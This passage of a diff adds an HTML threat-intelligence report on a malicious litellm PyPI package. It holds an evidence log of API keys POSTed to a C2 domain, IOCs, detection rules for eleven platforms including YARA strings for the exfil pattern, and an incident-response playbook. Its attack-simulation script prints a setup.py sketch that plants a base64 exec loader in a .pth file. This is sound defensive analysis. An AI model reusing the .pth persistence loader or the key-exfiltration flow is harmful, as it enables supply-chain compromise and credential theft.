+read(5, "OPENAI_API_KEY=sk-proj-...\nANTHROPIC_API_KEY=sk-ant-...\n", 4096)
+close(5)
+&rarr; Python process (python3) reading .env at startup
+&rarr; Not triggered by any import statement — pure .pth execution</div>
+        </div>
+      </div>
+
+      <div class="mtt-item">
+        <div class="mtt-tactic" data-en="Exfiltration" data-tr="Sızdırma">Exfiltration</div>
+        <div class="mtt-technique-title">T1041 &mdash; Exfiltration over HTTPS to models.litellm.cloud</div>
+        <div class="mtt-tids"><span class="mtt-tid">T1041</span><span class="mtt-tid">T1071.001</span></div>
+        <div class="mtt-desc" data-en="Credentials exfiltrated to models.litellm.cloud:443 via HTTPS POST mimicking LiteLLM telemetry API calls. Traffic is indistinguishable from legitimate LiteLLM usage at the network layer without DNS analysis. Secondary C2 checkmarx.zone used as fallback." data-tr="Kimlik bilgileri, LiteLLM telemetri API çağrılarını taklit eden HTTPS POST aracılığıyla models.litellm.cloud:443'e sızdırılır. DNS analizi olmadan ağ katmanında meşru LiteLLM kullanımından ayırt edilemez. Yedek olarak checkmarx.zone ikincil C2 kullanılır.">Credentials exfiltrated to models.litellm.cloud:443 via HTTPS POST mimicking LiteLLM telemetry API calls. Traffic is indistinguishable from legitimate LiteLLM usage at the network layer without DNS analysis. Secondary C2 checkmarx.zone used as fallback.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title" data-en="DNS Query Log" data-tr="DNS Sorgu Günlüğü">DNS Query Log</span>
+            <span class="mtt-evidence-src">Corporate DNS / Proxy Logs</span>
+          </div>
+          <div class="mtt-evidence-body">DNS query: models.litellm.cloud &rarr; 45.148.10.212
+  (legitimate: litellm.ai &rarr; 104.x.x.x)
+DNS query: checkmarx.zone &rarr; 83.142.209.11
+  (NOT Checkmarx Inc. checkmarx.com domain)
+POST https://models.litellm.cloud/v1/telemetry
+  {"keys": {"openai": "sk-proj-...", "anthropic": "sk-ant-..."}}
+&rarr; Content-Type: application/json
+&rarr; Looks identical to legitimate LiteLLM proxy calls</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ══ IOCs ══ -->
+  <div class="reveal" id="iocs">
+    <div class="section-label" data-en="Indicators of Compromise" data-tr="Uzlaşma Göstergeleri">Indicators of Compromise</div>
+    <h2 data-en="IOCs — Use for Threat Hunting" data-tr="IOC'ler — Tehdit Avı İçin Kullanın">IOCs &mdash; Use for Threat Hunting</h2>
+    <div class="table-wrap">
+      <table class="ioc-table">
+        <thead>
+          <tr>
+            <th>Indicator</th>
+            <th>Type</th>
+            <th>Confidence</th>
+            <th>VirusTotal</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code class="ioc-val">models.litellm.cloud</code></td>
+            <td><span class="ioc-type">Domain (C2 Primary)</span></td>
+            <td><span class="ioc-conf high">HIGH</span></td>
+            <td><a class="vt-btn" href="https://www.virustotal.com/gui/domain/models.litellm.cloud" target="_blank" rel="noopener">VT &nearr;</a></td>
+          </tr>
+          <tr>
+            <td><code class="ioc-val">checkmarx.zone</code></td>
+            <td><span class="ioc-type">Domain (C2 Secondary)</span></td>
+            <td><span class="ioc-conf high">HIGH</span></td>
+            <td><a class="vt-btn" href="https://www.virustotal.com/gui/domain/checkmarx.zone" target="_blank" rel="noopener">VT &nearr;</a></td>
+          </tr>
+          <tr>
+            <td><code class="ioc-val">45.148.10.212</code></td>
+            <td><span class="ioc-type">IP (C2 Primary)</span></td>
+            <td><span class="ioc-conf high">HIGH</span></td>
+            <td><a class="vt-btn" href="https://www.virustotal.com/gui/ip-address/45.148.10.212" target="_blank" rel="noopener">VT &nearr;</a></td>
+          </tr>
+          <tr>
+            <td><code class="ioc-val">83.142.209.11</code></td>
+            <td><span class="ioc-type">IP (C2 Secondary)</span></td>
+            <td><span class="ioc-conf high">HIGH</span></td>
+            <td><a class="vt-btn" href="https://www.virustotal.com/gui/ip-address/83.142.209.11" target="_blank" rel="noopener">VT &nearr;</a></td>
+          </tr>
+          <tr>
+            <td><code class="ioc-val">sitecustomize.pth</code></td>
+            <td><span class="ioc-type">Filename (Artifact)</span></td>
+            <td><span class="ioc-conf high">HIGH</span></td>
+            <td>&mdash;</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ══ DETECTION ══ -->
+  <div class="reveal" id="detection">
+    <div class="team-label team-blue">&#128309; Blue Team</div>
+    <div class="section-label" data-en="Detection Engineering" data-tr="Tespit Mühendisliği">Detection Engineering</div>
+    <h2 data-en="Detection Rules — 11 Platforms" data-tr="Tespit Kuralları — 11 Platform">Detection Rules &mdash; 11 Platforms</h2>
+    <p data-en="All rules are TTP-based and behavioral. Key detection signals: Python reading .env files at startup (not import time), outbound HTTPS to models.litellm.cloud, new .pth files written to site-packages by pip." data-tr="Tüm kurallar TTP tabanlı ve davranışsaldır. Temel tespit sinyalleri: Python'ın başlangıçta (import zamanı değil) .env dosyalarını okuması, models.litellm.cloud'a giden HTTPS trafiği, pip tarafından site-packages'e yazılan yeni .pth dosyaları.">All rules are <strong>TTP-based and behavioral</strong>. Key detection signals: Python reading .env files at startup (not import time), outbound HTTPS to models.litellm.cloud, new .pth files written to site-packages by pip.</p>
+
+    <!-- SIEM GROUP -->
+    <div class="rule-group">
+      <div class="rule-group-hd">
+        <span class="rgb-siem">SIEM</span>
+        <span class="rule-group-label">Rules 1&ndash;4: Sigma (YAML) / Sentinel (KQL) / Splunk (SPL) / QRadar (AQL)</span>
+      </div>
+
+      <!-- Rule 1: Sigma -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Sigma (YAML)</span>
+            pip Writing .pth File to site-packages
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              sigma-pip-pth-write.yml &mdash; T1546 / T1195.001
+            </div>
+            <div class="code-body"><span class="kw">title</span>: Malicious pip Package &mdash; .pth File Written to site-packages
+<span class="kw">id</span>: 9a3b5c7d-1e2f-4a6b-8c9d-0e1f2a3b4c5d
+<span class="kw">status</span>: experimental
+<span class="kw">description</span>: Detects .pth files written to Python site-packages during pip install
+           &mdash; supply chain persistence mechanism (CVE-2026-33634 pattern)
+<span class="kw">author</span>: TI-DE
+<span class="kw">date</span>: <span class="num">2026/03/26</span>
+<span class="kw">tags</span>:
+  - attack.persistence
+  - attack.t1546
+  - attack.t1195.001
+<span class="kw">logsource</span>:
+  category: file_event
+  product: linux
+<span class="kw">detection</span>:
+  selection:
+    TargetFilename|endswith: <span class="str">'.pth'</span>
+    TargetFilename|contains: <span class="str">'site-packages'</span>
+    Image|endswith:
+      - <span class="str">'/pip'</span>
+      - <span class="str">'/pip3'</span>
+      - <span class="str">'/python'</span>
+      - <span class="str">'/python3'</span>
+  filter_known_good:
+    TargetFilename|contains:
+      - <span class="str">'easy-install.pth'</span>
+  condition: selection and not filter_known_good
+<span class="kw">falsepositives</span>:
+  - Legitimate packages that use .pth for namespace packages
+<span class="kw">level</span>: medium</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 2: Sentinel KQL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Microsoft Sentinel (KQL)</span>
+            Outbound HTTPS to models.litellm.cloud or checkmarx.zone
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              sentinel-litellm-c2.kql &mdash; T1041 / T1071.001
+            </div>
+            <div class="code-body"><span class="cmt">// DNS and proxy logs — C2 domain detection</span>
+<span class="fn">DnsEvents</span>
+| <span class="kw">where</span> Name <span class="fn">has_any</span> (<span class="str">"models.litellm.cloud"</span>, <span class="str">"checkmarx.zone"</span>)
+| <span class="fn">union</span> (<span class="fn">CommonSecurityLog</span>
+  | <span class="kw">where</span> DestinationHostName <span class="fn">has_any</span> (<span class="str">"models.litellm.cloud"</span>, <span class="str">"checkmarx.zone"</span>)
+  | <span class="fn">project</span> TimeGenerated, SourceIP, DestinationHostName, RequestURL)
+| <span class="fn">project</span> TimeGenerated, Computer, ClientIP, Name, DestinationHostName
+| <span class="fn">extend</span> Severity = <span class="str">"High"</span>,
+         TTP = <span class="str">"T1041 - LiteLLM Supply Chain C2"</span>,
+         CVE = <span class="str">"CVE-2026-33634"</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 3: Splunk SPL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Splunk (SPL)</span>
+            Python Reading .env File at Process Start
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              splunk-python-env-read.spl &mdash; T1552.001
+            </div>
+            <div class="code-body"><span class="fn">index</span>=endpoint <span class="kw">sourcetype</span>=auditd <span class="kw">type</span>=SYSCALL
+| <span class="kw">where</span> <span class="fn">like</span>(exe, <span class="str">"%python%"</span>)
+  AND <span class="fn">like</span>(a0, <span class="str">"%.env%"</span>) AND syscall=<span class="str">"openat"</span>
+| <span class="fn">stats</span> count <span class="kw">by</span> _time, host, exe, a0, ppid, pid
+| <span class="kw">where</span> NOT <span class="fn">like</span>(exe, <span class="str">"%dotenv%"</span>)
+| <span class="fn">eval</span> alert=<span class="str">"Python reading .env at startup — .pth exfil pattern"</span>
+| <span class="fn">table</span> _time, host, exe, a0, ppid, alert</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 4: QRadar AQL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">QRadar (AQL)</span>
+            LiteLLM Supply Chain — C2 Network Connection
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              qradar-litellm-c2.aql &mdash; T1041 / T1071.001
+            </div>
+            <div class="code-body"><span class="kw">SELECT</span> sourceip, destinationip, <span class="str">"Destination Hostname"</span>,
+       <span class="str">"URL"</span>, <span class="str">"Bytes Sent"</span>, starttime
+<span class="kw">FROM</span> flows
+<span class="kw">WHERE</span> (<span class="str">"Destination Hostname"</span> <span class="kw">ILIKE</span> <span class="str">'%litellm.cloud%'</span>
+   <span class="kw">OR</span> <span class="str">"Destination Hostname"</span> <span class="kw">ILIKE</span> <span class="str">'%checkmarx.zone%'</span>
+   <span class="kw">OR</span> destinationip <span class="kw">IN</span> (<span class="str">'45.148.10.212'</span>, <span class="str">'83.142.209.11'</span>))
+<span class="kw">AND</span> starttime > <span class="fn">NOW</span>() - <span class="num">24</span> HOURS
+<span class="kw">ORDER BY</span> starttime <span class="kw">DESC</span></div>
+          </div>
+        </div>
+      </div>
+    </div><!-- /SIEM group -->
+
+    <!-- EDR/XDR GROUP -->
+    <div class="rule-group">
+      <div class="rule-group-hd">
+        <span class="rgb-edr">EDR / XDR</span>
+        <span class="rule-group-label">Rules 5&ndash;10: Defender (KQL) / Cortex XDR (XQL) / CrowdStrike (SPL) / CrowdStrike IOA / Carbon Black (CBQL) / SentinelOne (PowerQuery)</span>
+      </div>
+
+      <!-- Rule 5: MDE KQL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Defender for Endpoint (KQL)</span>
+            Python Process Making Outbound Connection to C2
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              mde-python-litellm-c2.kql &mdash; T1041 / T1059.006
+            </div>
+            <div class="code-body"><span class="fn">DeviceNetworkEvents</span>
+| <span class="kw">where</span> InitiatingProcessFileName <span class="fn">in~</span> (<span class="str">"python.exe"</span>, <span class="str">"python3.exe"</span>, <span class="str">"python3"</span>)
+| <span class="kw">where</span> RemoteUrl <span class="fn">has_any</span> (<span class="str">"litellm.cloud"</span>, <span class="str">"checkmarx.zone"</span>)
+   <span class="kw">or</span> RemoteIP <span class="fn">in</span> (<span class="str">"45.148.10.212"</span>, <span class="str">"83.142.209.11"</span>)
+| <span class="fn">project</span> Timestamp, DeviceName, InitiatingProcessCommandLine,
+          RemoteUrl, RemoteIP, RemotePort, InitiatingProcessAccountName
+| <span class="fn">extend</span> TTP = <span class="str">"T1041 - LiteLLM Supply Chain Exfil (CVE-2026-33634)"</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 6: Cortex XQL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Cortex XDR (XQL)</span>
+            Python .pth Persistence — site-packages File Write
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              cortex-pth-write.xql &mdash; T1546
+            </div>
+            <div class="code-body"><span class="kw">dataset</span> = xdr_data
+| <span class="kw">filter</span> event_type = ENUM.EVENT_TYPE_FILE
+| <span class="kw">filter</span> action_file_name <span class="kw">ends with</span> <span class="str">".pth"</span>
+| <span class="kw">filter</span> action_file_path <span class="kw">contains</span> <span class="str">"site-packages"</span>
+| <span class="kw">filter</span> actor_process_image_name <span class="kw">in</span> (<span class="str">"pip"</span>, <span class="str">"pip3"</span>, <span class="str">"python"</span>, <span class="str">"python3"</span>)
+| <span class="fn">fields</span> _time, agent_hostname, actor_process_image_name,
+         action_file_path, action_file_name, actor_effective_uid</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 7: CrowdStrike SPL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">CrowdStrike Hunting (SPL)</span>
+            Python Connecting to LiteLLM Typosquat Domain
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              crowdstrike-python-litellm-c2.spl &mdash; T1041
+            </div>
+            <div class="code-body"><span class="fn">index</span>=crowdstrike <span class="kw">event_simpleName</span>=NetworkConnect
+| <span class="kw">where</span> ImageFileName LIKE <span class="str">"%python%"</span>
+  AND (RemoteDomainName LIKE <span class="str">"%litellm.cloud%"</span>
+       OR RemoteDomainName LIKE <span class="str">"%checkmarx.zone%"</span>
+       OR RemoteIP IN (<span class="str">"45.148.10.212"</span>, <span class="str">"83.142.209.11"</span>))
+| <span class="fn">table</span> _time, ComputerName, UserName, ImageFileName,
+         RemoteDomainName, RemoteIP, RemotePort
+| <span class="fn">eval</span> ttp=<span class="str">"T1041 - CVE-2026-33634 LiteLLM C2"</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 8: CrowdStrike Custom IOA -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">CrowdStrike Custom IOA</span>
+            pip Writing .pth to site-packages
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              crowdstrike-ioa-pth-write.json &mdash; T1546
+            </div>
+            <div class="code-body">{
+  <span class="str">"name"</span>: <span class="str">"CVE-2026-33634 LiteLLM &mdash; .pth Persistence Write"</span>,
+  <span class="str">"description"</span>: <span class="str">"pip writing .pth file to Python site-packages &mdash; supply chain persistence"</span>,
+  <span class="str">"platform"</span>: <span class="str">"Linux"</span>,
+  <span class="str">"severity"</span>: <span class="str">"High"</span>,
+  <span class="str">"rule_type"</span>: <span class="str">"file_write"</span>,
+  <span class="str">"disposition"</span>: <span class="str">"Alert"</span>,
+  <span class="str">"conditions"</span>: [
+    {
+      <span class="str">"field"</span>: <span class="str">"ImageFileName"</span>,
+      <span class="str">"operator"</span>: <span class="str">"MATCH"</span>,
+      <span class="str">"value"</span>: <span class="str">"(pip|pip3|python|python3)"</span>
+    },
+    {
+      <span class="str">"field"</span>: <span class="str">"TargetFileName"</span>,
+      <span class="str">"operator"</span>: <span class="str">"MATCH"</span>,
+      <span class="str">"value"</span>: <span class="str">".*site-packages.*\\.pth$"</span>
+    }
+  ]
+}</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 9: Carbon Black -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">Carbon Black (CBQL)</span>
+            pip Process Writing .pth File
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              cb-pip-pth.cbql &mdash; T1546
+            </div>
+            <div class="code-body">process_name:pip OR process_name:pip3 OR process_name:python3
+AND filemod_name:*.pth
+AND filemod_name:*site-packages*
+AND filemod_type:CREATE
+| fields device_name, username, process_name,
+         filemod_name, process_start_time</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Rule 10: SentinelOne -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">SentinelOne (PowerQuery)</span>
+            Python Supply Chain .pth Persistence
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              s1-pth-persistence.pq &mdash; T1546 / T1195.001
+            </div>
+            <div class="code-body">EventType = "FileCreation" AND
+SrcProcName In ("pip", "pip3", "python3") AND
+TgtFilePath Contains "site-packages" AND
+TgtFileExtension = ".pth"
+| columns EndpointName, SrcUserName, SrcProcName,
+           TgtFilePath, TgtFileName, EventTime</div>
+          </div>
+        </div>
+      </div>
+    </div><!-- /EDR group -->
+
+    <!-- PATTERN GROUP -->
+    <div class="rule-group">
+      <div class="rule-group-hd">
+        <span class="rgb-pattern">Pattern</span>
+        <span class="rule-group-label">Rule 11: YARA (Pattern)</span>
+      </div>
+
+      <!-- Rule 11: YARA -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title">
+            <span class="platform-badge">YARA (Pattern)</span>
+            LiteLLM Supply Chain &mdash; .pth Malicious Payload Pattern
+          </div>
+          <div class="rule-toggle">&#9660;</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              yara-litellm-pth.yar &mdash; T1546 / CVE-2026-33634
+            </div>
+            <div class="code-body"><span class="kw">rule</span> LiteLLM_Supply_Chain_PTH_Persistence {
+  <span class="kw">meta</span>:
+    description = <span class="str">"CVE-2026-33634 LiteLLM PyPI — TeamPCP .pth payload"</span>
+    author      = <span class="str">"TI-DE"</span>
+    date        = <span class="str">"2026-03-26"</span>
+    tlp         = <span class="str">"WHITE"</span>
+
+  <span class="kw">strings</span>:
+    <span class="cmt">// Base64+exec pattern in .pth files</span>
+    $pth_exec   = <span class="str">"import subprocess,os,base64;exec("</span>
+    <span class="cmt">// C2 domain reference</span>
+    $c2_primary = <span class="str">"models.litellm.cloud"</span>
+    $c2_second  = <span class="str">"checkmarx.zone"</span>
+    <span class="cmt">// AI key target pattern</span>
+    $key_target = <span class="str">"OPENAI_API_KEY"</span>
+
+  <span class="kw">condition</span>:
+    $pth_exec or ($c2_primary and $key_target)
+    or ($c2_second and $key_target)
+}</div>
+          </div>
+        </div>
+      </div>
+    </div><!-- /Pattern group -->
+
+  </div>
+
+  <!-- ══ RECOMMENDATIONS ══ -->
+  <div class="reveal" id="recommendations">
+    <div class="team-label team-blue">&#128309; Blue Team</div>
+    <div class="section-label" data-en="Response &amp; Hardening" data-tr="Yanıt ve Sertleştirme">Response &amp; Hardening</div>
+    <h2 data-en="Incident Response Playbook" data-tr="Olay Müdahale Rehberi">Incident Response Playbook</h2>
+
+    <div class="detail-grid">
+      <div class="detail-card">
+        <div class="detail-card-title" data-en="Immediate Actions (0–2h)" data-tr="Anlık Aksiyonlar (0–2s)">Immediate Actions (0&ndash;2h)</div>
+        <div class="detail-row"><div class="detail-key">1</div><div class="detail-val">Rotate ALL AI API keys: OpenAI, Anthropic, Cohere, AWS, Google immediately</div></div>
+        <div class="detail-row"><div class="detail-key">2</div><div class="detail-val">Find and remove .pth artifact: <code>find $(python3 -c "import site; print(site.getsitepackages()[0])") -name "sitecustomize.pth"</code></div></div>
+        <div class="detail-row"><div class="detail-key">3</div><div class="detail-val">Check for systemd persistence: <code>systemctl --user list-units | grep -v known-good</code></div></div>
+        <div class="detail-row"><div class="detail-key">4</div><div class="detail-val">Block DNS: models.litellm.cloud, checkmarx.zone at corporate DNS/proxy</div></div>
+        <div class="detail-row"><div class="detail-key">5</div><div class="detail-val">Block IPs: 45.148.10.212, 83.142.209.11 at firewall</div></div>
+      </div>
+      <div class="detail-card">
+        <div class="detail-card-title" data-en="Hardening (Ongoing)" data-tr="Sertleştirme (Sürekli)">Hardening (Ongoing)</div>
+        <div class="detail-row"><div class="detail-key">1</div><div class="detail-val">Enable pip --no-scripts flag in CI/CD pipelines to block postinstall hooks</div></div>
+        <div class="detail-row"><div class="detail-key">2</div><div class="detail-val">Use private PyPI mirrors with allowlisting for production environments</div></div>
+        <div class="detail-row"><div class="detail-key">3</div><div class="detail-val">Monitor site-packages for new .pth files via EDR file integrity monitoring</div></div>
+        <div class="detail-row"><div class="detail-key">4</div><div class="detail-val">Store AI API keys in secrets managers (AWS Secrets Manager, Vault) — never in .env files committed to repos</div></div>
+        <div class="detail-row"><div class="detail-key">5</div><div class="detail-val">Audit Python package dependency trees in requirements.txt regularly (pip-audit, safety)</div></div>
+      </div>
+    </div>
+  </div>
+
+</main>
+
+<footer class="site-footer">
+  <div>TI-DE &mdash; Threat Intelligence &amp; Detection Engineering</div>
+  <div>TLP:WHITE &mdash; Free to share &mdash; <a href="https://github.com/mazlumbaydar/TI-DE">GitHub</a></div>
+</footer>
+
+<script>
+/* ═══════════════════════════════════════════════════════════════
+   LANGUAGE TOGGLE
+═══════════════════════════════════════════════════════════════ */
+const LANG_KEY  = 'ti-de-report-lang';
+const THEME_KEY = 'ti-de-report-theme';
+let _lang  = localStorage.getItem(LANG_KEY)  || 'en';
+let _theme = localStorage.getItem(THEME_KEY) || 'dark';
+
+function applyLang(lang) {
+  _lang = lang;
+  localStorage.setItem(LANG_KEY, lang);
+  const btn = document.getElementById('langBtn');
+  if (btn) btn.innerHTML = '&#127760; ' + (lang === 'en' ? 'TR' : 'EN');
+  document.querySelectorAll('[data-en]').forEach(el => {
+    const val = lang === 'en' ? el.dataset.en : (el.dataset.tr || el.dataset.en);
+    el.innerHTML = val;
+  });
+}
+
+function toggleLang() {
+  applyLang(_lang === 'en' ? 'tr' : 'en');
+}
+
+function applyTheme(theme) {
+  _theme = theme;
+  document.documentElement.setAttribute('data-theme', theme);
+  localStorage.setItem(THEME_KEY, theme);
+  const btn = document.getElementById('themeBtn');
+  if (btn) btn.textContent = theme === 'dark' ? '\u2600 Light' : '\uD83C\uDF19 Dark';
+}
+
+function toggleTheme() {
+  applyTheme(_theme === 'dark' ? 'light' : 'dark');
+}
+
+/* ═══════════════════════════════════════════════════════════════
+   SCROLL + NAV + REVEAL
+═══════════════════════════════════════════════════════════════ */
+window.addEventListener('scroll', () => {
+  const h = document.documentElement;
+  const pct = h.scrollHeight - h.clientHeight;
+  document.getElementById('prog').style.width = (pct ? (h.scrollTop / pct * 100) : 0) + '%';
+  document.getElementById('nav').classList.toggle('scrolled', window.scrollY > 60);
+});
+
+const revealObs = new IntersectionObserver(entries => {
+  entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+}, { threshold: 0.06 });
+document.querySelectorAll('.reveal').forEach(el => revealObs.observe(el));
+
+/* ═══════════════════════════════════════════════════════════════
+   STAT COUNTERS
+═══════════════════════════════════════════════════════════════ */
+const countObs = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (!e.isIntersecting) return;
+    const el = e.target;
+    const target = parseFloat(el.dataset.t);
+    const isFloat = String(el.dataset.t).includes('.');
+    const dur = 1200, start = performance.now();
+    const tick = now => {
+      const p = Math.min((now - start) / dur, 1);
+      const v = target * (1 - Math.pow(1 - p, 3));
+      el.textContent = isFloat ? v.toFixed(1) : Math.round(v);
+      if (p < 1) requestAnimationFrame(tick);
+    };
+    requestAnimationFrame(tick);
+    countObs.unobserve(el);
+  });
+});
+document.querySelectorAll('[data-t]').forEach(el => countObs.observe(el));
+
+/* ═══════════════════════════════════════════════════════════════
+   ATTACK CHAIN ANIMATION
+═══════════════════════════════════════════════════════════════ */
+const chainObs = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      document.querySelectorAll('.chain-step').forEach((s, i) => {
+        setTimeout(() => s.classList.add('visible'), i * 160);
+      });
+      chainObs.disconnect();
+    }
+  });
+}, { threshold: 0.08 });
+const chainEl = document.getElementById('chainSteps');
+if (chainEl) chainObs.observe(chainEl);
+
+/* ═══════════════════════════════════════════════════════════════
+   RULE CARD TOGGLES
+═══════════════════════════════════════════════════════════════ */
+function toggleRule(card) { card.classList.toggle('open'); }
+
+/* ═══════════════════════════════════════════════════════════════
+   ATTACK SIMULATION
+═══════════════════════════════════════════════════════════════ */
+const ATV_NODES = ['vn0','vn1','vn2','vn3','vn4','vn5'];
+const ATV_CONNS = ['vc0','vc1','vc2','vc3','vc4'];
+
+const ATV_STEPS = [
+  {
+    node: 0, conn: null, connType: '', nodeType: 'active',
+    stepLabel: 'STEP 1 \u2014 Malicious litellm Package Uploaded to PyPI',
+    stepLabelTR: 'ADIM 1 \u2014 K\u00f6t\u00fc Niyetli litellm Paketi PyPI\'ye Y\u00fcklendi',
+    text: 'TeamPCP uploads a malicious litellm package to PyPI. Package metadata mirrors the legitimate library. A .pth file is embedded that will be written to site-packages on any machine that installs this version.',
+    textTR: 'TeamPCP, PyPI\'ye k\u00f6t\u00fc niyetli bir litellm paketi y\u00fckler. Paket meta verileri me\u015fru k\u00fct\u00fcphaneyi yans\u0131t\u0131r. Bu versiyonu kuran her makineye site-packages\'e yaz\u0131lacak bir .pth dosyas\u0131 g\u00f6m\u00fcl\u00fcd\u00fcr.',
+    cmd: '# TeamPCP creates malicious package\n# setup.py contains:\nfrom setuptools import setup\n\ndef install_persistence():\n    import site, os\n    sp = site.getsitepackages()[0]\n    pth = os.path.join(sp, "sitecustomize.pth")\n    with open(pth, "w") as f:\n        f.write("import subprocess,os,base64;exec(base64.b64decode(\'...\'))\\n")\n\nsetup(\n    name="litellm",\n    version="1.x.x",\n    cmdclass={...install_persistence...}\n)',
+    explain: 'Package metadata (description, classifiers, keywords) is copied from the legitimate litellm package. PyPI automated scanning does not execute setup.py code, so the malicious .pth installer passes initial review.'
+  },
+  {
+    node: 1, conn: 0, connType: 'active', nodeType: 'active',
+    stepLabel: 'STEP 2 \u2014 pip install Writes .pth Persistence File',
+    stepLabelTR: 'ADIM 2 \u2014 pip install .pth Kal\u0131c\u0131l\u0131k Dosyas\u0131n\u0131 Yaz\u0131yor',
+    text: 'Developer runs pip install litellm. During installation, setup.py writes sitecustomize.pth to Python\'s site-packages directory. This is a standard Python feature: .pth files are read and executed by the Python interpreter at every startup.',
+    textTR: 'Geli\u015ftirici pip install litellm \u00e7al\u0131\u015ft\u0131r\u0131r. Kurulum s\u0131ras\u0131nda setup.py, Python\'un site-packages dizinine sitecustomize.pth yazar. Bu standart bir Python \u00f6zelli\u011fidir: .pth dosyalar\u0131 her ba\u015flang\u0131\u00e7ta Python yorumlay\u0131c\u0131s\u0131 taraf\u0131ndan okunur ve \u00e7al\u0131\u015ft\u0131r\u0131l\u0131r.',
